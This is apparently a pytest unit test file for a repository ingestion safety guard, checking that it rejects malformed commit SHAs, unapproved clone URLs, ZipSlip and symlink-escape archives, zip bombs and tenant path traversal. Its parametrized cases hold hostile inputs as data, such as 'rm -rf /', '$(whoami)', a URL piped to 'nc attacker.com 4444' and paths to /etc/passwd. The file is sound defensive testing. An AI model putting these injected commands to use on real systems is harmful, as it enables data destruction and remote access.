"""Unit Tests for Repository Safety Guard, Path Traversal, and Sandbox Defenses."""

import tarfile
import zipfile
from pathlib import Path

import pytest

from packages.shared.errors import SecurityViolationError
from packages.shared.ingestion.safety import RepoSafetyGuard


def test_validate_commit_sha_valid():
    """Verifies that 7-40 char hexadecimal commit SHAs pass validation."""
    assert RepoSafetyGuard.validate_commit_sha("a" * 40) == "a" * 40
    assert RepoSafetyGuard.validate_commit_sha("7f8a9b1") == "7f8a9b1"
    assert (
        RepoSafetyGuard.validate_commit_sha("1234567890abcdef1234567890abcdef12345678")
        == "1234567890abcdef1234567890abcdef12345678"
    )


@pytest.mark.parametrize(
    "invalid_sha",
    [
        "not-hexadecimal!",
        "commit; rm -rf /",
        "abc`id`",
        "12345",  # Too short (< 7)
        "a" * 65,  # Too long (> 64)
        "../../../etc/passwd",
        "$(whoami)",
    ],
)
def test_validate_commit_sha_rejection(invalid_sha: str):
    """Rejects malformed or malicious commit SHA strings to prevent command injection."""
    with pytest.raises(SecurityViolationError) as exc:
        RepoSafetyGuard.validate_commit_sha(invalid_sha)
    assert "Invalid commit SHA" in str(exc.value)


def test_validate_clone_url_approved_hosts():
    """Validates URLs pointing to approved git hosts."""
    assert RepoSafetyGuard.validate_clone_url("https://github.com/org/repo.git") == "https://github.com/org/repo.git"
    assert RepoSafetyGuard.validate_clone_url("https://gitlab.com/org/service") == "https://gitlab.com/org/service"
    assert (
        RepoSafetyGuard.validate_clone_url("https://bitbucket.org/team/api.git") == "https://bitbucket.org/team/api.git"
    )


@pytest.mark.parametrize(
    "malicious_url",
    [
        "https://github.com/org/repo; rm -rf /",
        "https://github.com/org/repo | nc attacker.com 4444",
        "https://github.com/org/repo`id`",
        "https://unapproved-malicious-host.com/repo.git",
        "ftp://github.com/org/repo.git",
        "http://github.com/org/repo\nrm -rf /",
    ],
)
def test_validate_clone_url_rejections(malicious_url: str):
    """Rejects unapproved hosts, shell metacharacters, and unsafe schemes."""
    with pytest.raises(SecurityViolationError):
        RepoSafetyGuard.validate_clone_url(malicious_url)


def test_zipslip_path_traversal_defense(tmp_path: Path):
    """Detects and blocks ZipSlip directory traversal attacks inside zip archives."""
    malicious_zip = tmp_path / "malicious.zip"
    dest_dir = tmp_path / "sandbox"

    # Create zip containing a path traversal member
    with zipfile.ZipFile(malicious_zip, "w") as zf:
        zf.writestr("../../escaped_file.txt", "pwned")

    with pytest.raises(SecurityViolationError) as exc:
        RepoSafetyGuard.safe_extract_archive(malicious_zip, dest_dir)
    assert "ZipSlip" in str(exc.value)
    assert not (tmp_path / "escaped_file.txt").exists()


def test_zip_size_bomb_defense(tmp_path: Path):
    """Detects and rejects archive files that exceed cumulative uncompressed size limits."""
    bomb_zip = tmp_path / "bomb.zip"
    dest_dir = tmp_path / "sandbox"

    with zipfile.ZipFile(bomb_zip, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        # 2 MB of zeroes compressed down to a few bytes
        zf.writestr("zeroes.bin", b"\x00" * (2 * 1024 * 1024))

    # Test with 1 MB limit
    with pytest.raises(SecurityViolationError) as exc:
        RepoSafetyGuard.safe_extract_archive(bomb_zip, dest_dir, max_size_bytes=1024 * 1024)
    assert "exceeds limit" in str(exc.value)


def test_tar_symlink_escape_defense(tmp_path: Path):
    """Blocks tar archives containing symlinks that resolve outside the destination sandbox."""
    malicious_tar = tmp_path / "symlink_escape.tar"
    dest_dir = tmp_path / "sandbox"
    dest_dir.mkdir(parents=True, exist_ok=True)

    with tarfile.open(malicious_tar, "w") as tf:
        # Create a symlink pointing to /etc/passwd or outside directory
        ti = tarfile.TarInfo(name="symlink_leak")
        ti.type = tarfile.SYMTYPE
        ti.linkname = "../../../../../etc/passwd"
        tf.addfile(ti)

    with pytest.raises(SecurityViolationError) as exc:
        RepoSafetyGuard.safe_extract_archive(malicious_tar, dest_dir)
    assert "Symlink traversal attempt" in str(exc.value)


def test_tenant_storage_path_isolation(tmp_path: Path):
    """Verifies that tenant storage paths enforce hierarchical isolation and reject traversal."""
    tenant_id = "tenant-safe-01"
    workspace_id = "ws-prod"
    repo_id = "repo-backend"
    sha = "a" * 40

    path = RepoSafetyGuard.get_tenant_storage_path(
        tenant_id=tenant_id,
        workspace_id=workspace_id,
        repo_id=repo_id,
        commit_sha=sha,
        base_dir=tmp_path,
    )

    assert path.exists()
    assert str(path).startswith(str(tmp_path))
    assert tenant_id in str(path)
    assert repo_id in str(path)
    assert sha in str(path)

    # Reject directory traversal attempts in identifiers
    with pytest.raises(SecurityViolationError):
        RepoSafetyGuard.get_tenant_storage_path(
            tenant_id="../../etc",
            workspace_id=workspace_id,
            repo_id=repo_id,
            commit_sha=sha,
            base_dir=tmp_path,
        )
